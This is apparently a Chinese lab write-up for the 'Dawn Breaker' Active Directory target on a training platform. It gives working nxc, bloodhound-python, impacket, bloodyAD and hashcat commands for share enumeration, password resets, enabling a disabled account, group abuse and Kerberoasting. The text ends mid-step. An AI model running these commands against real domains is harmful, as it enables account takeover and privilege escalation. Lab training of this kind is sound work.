---
title: [无境原创] Dawn Breaker 域靶机 官方wp发布
url: https://mp.weixin.qq.com/s/OZfUKQC0ueX_1qt-NvgQaA
source: Doonsec's feed
date: 2026-05-21
fetch_date: 2026-05-22T06:06:16.013341
---

# [无境原创] Dawn Breaker 域靶机 官方wp发布

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/IicMcDFtTOlPdXia4mI1hK7TUORAkWTH9ib7SRrP4ibtYZYO84f5yukYGiaFoOvQqtpibdJkQ9FbKN7HVyCfnLQq0nXlFRibLvOypISZImkKlialvE0/0?wx_fmt=jpeg)

# [无境原创] Dawn Breaker 域靶机 官方wp发布

原创

棉花糖糖糖
棉花糖糖糖

棉花糖fans

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_gif/1mtwZURvGTkCK3ZFyqYEyTwmaLo2YSMeibz3eeShkewiadS4oh0RBl1U7BTVeEscGQrEbjWKcQzGpJEFLwr4cFQw/640?wx_fmt=gif&wxfrom=13&wx_lazy=1&tp=wxpic)

## 前言

# bdziyi.com/ulab，无境，英文名Unbounded Lab，是专为网络安全学习者打造的综合性实战平台，提供真实企业级漏洞环境，包含内网靶场、SRC靶场、WEB靶场、应急响应靶场。

# Dawn Breaker靶场链接：

# https://bdziyi.com/ulab/lab.html?page=target-detail&id=152

# ![跳转无境靶场首页-棉花糖会员站](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlP8bKj0DKq2a2kKgKsYoVozamDRUiaqRnZggk3odsII5QB8z7TVTd7UWatTLZicpG8qqSpzTclOHUxwKMVDaPniaeRjXAKibmGfD4c/640?wx_fmt=png&from=appmsg)

# Dawn Breaker WP

## 信息收集

### SMB Welcome 可读

```
nxc smb 192.168.111.10 -u '' -p ' ' --shares
```

![image-20260127155759208](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlNL7rIjqdo7CzmeDKGGfHzViczXGxgUfl4DqY4g0detOTUQMsq9UPzG5fUtNv7H5QsZtGvE2nwyX1wnJ9qEu2V7Sfiac6ia1KoH94/640?wx_fmt=png&from=appmsg)

image-20260127155759208

### 读取 Letter.txt 文件

![image-20260127155929312](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMVEj5J5Gmd8vdsb9XmiblZAiaSiabCDWHchibzRwR9hibFhlruT0eyArGWvKdTXJ2qjicgfc9wty4BzQHocKYbbMrLfWeAoTb6NBPak/640?wx_fmt=png&from=appmsg)

image-20260127155929312

![image-20260127155946791](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlPMuTNaG2m8WJPfj9A9sU9kbYqLTmxOuo34ibNiaGNhlZeq84gDNcRdicLmPjaSqVVJPn9Y69vkVVWog1ia6cxHLP1qIQ9SPnzgsPg/640?wx_fmt=png&from=appmsg)

image-20260127155946791

将这个信息作为用户名和密码进行尝试

```
nxc smb 192.168.111.10 -u 'Yangyang' -p 'Hello' --shares
```

![image-20260127160035430](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNT6Xf1yC9cVBJneqKCwHEvHl8hibawHyfXd1hKibtzpQ0CIbZsVYfE0OPsXwCIbqpBZga8A7uGRlzULurXXUXpYKFAR1KcmR21I/640?wx_fmt=png&from=appmsg)

image-20260127160035430

### 使用 bloodhound-python 进行信息收集

```
bloodhound-python -c All -u 'Yangyang' -p 'Hello' -ns 192.168.111.10 -d sec.lab -dc ad.sec.lab --zip --dns-tcp
```

![image-20260127160552931](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMIBPzIpXBQTCFojsWcYHMYZSnaCaeV4QY6KGM3oOs7mRicANjBLW43yp4pHfTayc7vSsA7p0vtgb3Fqe4DYMOsgHWIKO5tMaoM/640?wx_fmt=png&from=appmsg)

image-20260127160552931

但是线路到了 LAHAYO@SEC.LAB 就断开了，接着再分析是否有路线到达域控或者域管理员，看到有一个未知的节点可以RBCD到域控

![image-20260127160819071](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNMIWb3TYPRiaU1RZVNom6hiaouLo1cic1VzVWLNMoTZGicN5lhLjaD5W0y81ugWIFjFK5W8tsTUwerNBKFf0aUc4J7UQ3a1cJDdw0/640?wx_fmt=png&from=appmsg)

image-20260127160819071

### 第二条线路

![image-20260127161005143](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNYCYkHoZMFSsAq2Zlw0RaLbMkoVfPWYbUcnITWDiakRXorBWYibiaKNBSDTpEiaooa3OiaJEsUHreMff0VgeDxAYVIkEEBhfxRgxyk/640?wx_fmt=png&from=appmsg)

image-20260127161005143

经过分析发现 Rover 这个账户很特殊，它关联着一个计算机账户，SOLARIS@SEC.LAB 可以重置它的密码，但是现在还没有 SOLARIS@SEC.LAB 相关的信息

![image-20260127161127087](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlNibIibg49ZArCG5Ph4ZAk5ztpZP5NZxWPj1ibS8TlU6iayrQSgpdDg6BaTxz9yPlHLiaw8EzfKcPxxJKHLyQvqRWtSOmwKtmLnLrAw/640?wx_fmt=png&from=appmsg)

image-20260127161127087

![image-20260127161243989](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNgwQriaOChruYwI0EUJQiblOIPyAf8QkXyzT8VAicdGJCkVc4e3sl6xgFNwDyVCdJTIvb7icViaoXk8aia3EmD97Rm2gPiapJ8EuEcak/640?wx_fmt=png&from=appmsg)

image-20260127161243989

在目前这个情况下想要获取到 SOLARIS@SEC.LAB 有两个方法可以尝试：

1. Pre-Created Computer Account
2. Timeroasting

## 获取 SOLARIS@SEC.LAB 的控制权

发现 SOLARIS@SEC.LAB 其实是 `Pre-Created Computer Account`，利用之前的域账户就能获取到其 Kerberos 凭据，另外 `Pre-Created Computer Account` 的密码与账户名全小写一样

![image-20260127161805204](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlOGiaJuVMDbgUSAdQYH5I2PWTnzfHCmagsrjs312om3bqicjRPicdJPjot6lBV7bt1grzFHyCGu06OicpyELu46lAAjYv4l9C3Gh3U/640?wx_fmt=png&from=appmsg)

image-20260127161805204

![image-20260127162125299](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlOFIO1Cib2jupWBt4GHb1w8MibCn41D6QKJLX3KQOfKicoEpPUK28xyScX2nyTiaSAhasicbbAl3qFut8KMsoAnMmX6S25j4hZKKSico/640?wx_fmt=png&from=appmsg)

image-20260127162125299

### 重置 SOLARIS@SEC.LAB 自身密码

```
impacket-changepasswd -altuser 'SOLARIS$' -altpass 'solaris' -newpass '123456' -reset 'sec.lab/SOLARIS$'@ad.sec.lab -k -dc-ip 192.168.111.10
```

![image-20260127143528970](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMXr2sDCLWv5RUKSxVOaMM6TzWhzymB7Ht9zw4SgtjHny3DELKibW1t7FvhRibibM8bHjW3GmZbI4dLua0cIDtSS4Lmlf5icnNwDCE/640?wx_fmt=png&from=appmsg)

image-20260127143528970

## 获取 Rover 域用户的控制权

### 重置 Rover 的密码

```
bloodyAD -u 'Solaris$' -p '123456' -d sec.lab --host 192.168.111.10 set password Rover 123456
```

![image-20260127162301651](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNkl6bcPJ5QGqbPmFOIYX2MiaKlEyeaKFRIicHs6lciaJrvDSjpO5waGUibkEAZE6WXu6sAHEgoCPwBIANNRLGfz9DoLIaldmJOcVQ/640?wx_fmt=png&from=appmsg)

image-20260127162301651

验证账户不成功，根据报错来判断账户还没启用

![image-20260127162417942](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlMDwtyxic42dlVIibicQOEQjIB5IsxubwqTSzLedbthI9EibnyGVOvicxFQUckRaEmHyAR38PryJUAfA4rPTjaQK6YfMtlXiat52f4vg/640?wx_fmt=png&from=appmsg)

image-20260127162417942

### 启用 Rover 账户

```
bloodyAD -u 'Solaris$' -p '123456' -d sec.lab --host 192.168.111.10 remove uac Rover -f ACCOUNTDISABLE
```

![image-20260127162448345](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlMIiap0cpFazibme6QFtQPUQhdMLMmv70ab9nv7DiclzvFhaaHTmk74ia3ax5wftmRvkphSIjibInoQbVVpe8aQK6zwVB4JUDQLS56c/640?wx_fmt=png&from=appmsg)

image-20260127162448345

## Jinzhou 安全组

### AddSelf

Rover 用户是可以将自身加入 Jinzhou@SEC.LAB

```
bloodyAD -u Rover -p 123456 --host 192.168.111.10 -d sec.lab add groupMember Jinzhou Rover
```

![image-20260127162613183](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMTHNYesENiaaLJQrWLyvVpicMrySPVJbDKBzzE1xOok6ibOY1m1DTLydWFhJpVibTwJhYdRD4IGNqrJEnGno5u5STpDh6xF4LoicDg/640?wx_fmt=png&from=appmsg)

image-20260127162613183

![image-20260127162715025](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlPicRVDE34VpcFiaW12B47A2ZYY7dTrv2J9xvzgJjehibBI2maE1HmAOrmXR8KXj3UdHczfKMoicF4xJj4g7ft5NAn3KvzYj8aP9UA/640?wx_fmt=png&from=appmsg)

image-20260127162715025

### AddSPN

![image-20260127162811490](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlO8WDPtPxHYv5xiaoxhsOS6jSd9gFVKtGiaQrwGn3AQLq3ov8xgvWOGJrhtsYibdfUqprFbk5ots9JbS65A5MUDKicnbcdmUptKuok/640?wx_fmt=png&from=appmsg)

image-20260127162811490

根据ACL可以通过给图上四个用户添加 `servicePrincipalName` 来达到利用 `kerberoasting` 破解密码

```
bloodyAD -u 'Rover' -p '123456' -d sec.lab --host 192.168.111.10 set object Jinxi servicePrincipalName -v 'http/web'
```

![image-20260127163010676](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlOTibUFmFtM7STA3Y3nv2AHlGZzk4y3TggDx7AjzxBhx1v3NM1aicvRAUCMIb2icybyby2taObSGI690icGWYY8Q4d71eEBxo0ZDUY/640?wx_fmt=png&from=appmsg)

image-20260127163010676

```
nxc ldap 192.168.111.10 -u 'Rover' -p '123456' --kerberoasting KERBEROASTING
```

![image-20260127163036447](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlMLCXQE7eejVS6NnKgDg0hLLEcLib7rU5nD4bfOBoeLyEpiaBIibawAibtvh2p9TZcVUBDfogz1phwXfO6kicJhe2Xpibv1Lkmx623ws/640?wx_fmt=png&from=appmsg)

image-20260127163036447

```
hashcat KERBEROASTING /usr/share/wordlists/rockyou.txt
```

![image-20260127163120546](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMCbmRC75GeCnUM9N8ODGG4fMrU1uibgrz9iaZ16PCibN4H3iaRmgr1OOWMibOUmibHNcSfjxIRVuraIOFL5S4PUM6lko5GxcDLBfFo8/640?wx_fmt=png&from=appmsg)

image-20260127163120546

## Black Shores 安全组

### AddMember

![image-20260127163215281](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNicL9unzaGmJCqrVuwgn6SDBulxqd4st99ILPFmHdomQMH8gQiaic988DjAicTfia9GjoC5pP0wfhZpl25qPdWGJoD49I1uVZWPbw0/640?wx_fmt=png&from=appmsg)

image-20260127163215281

根据 JINXI@SEC.LAB 的ACL，将 Rover 加入 Black ShoresI@SEC.LAB

```
bloodyAD -u 'Jinxi' -p 'Jinxin' --host ad -d sec.lab add groupMember 'Black Shores' Rover
```

![image-20260127163330106](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlM7r8eSOabyw506zAW5NGsR5Gte3ZPSHeQ7mS82PfFUB67PMYJQ1oVcmQJK0wdFibFtrRSvIdRX111SPP0Fo6aVZgiagyBJsWXO8/640?wx_fmt=p...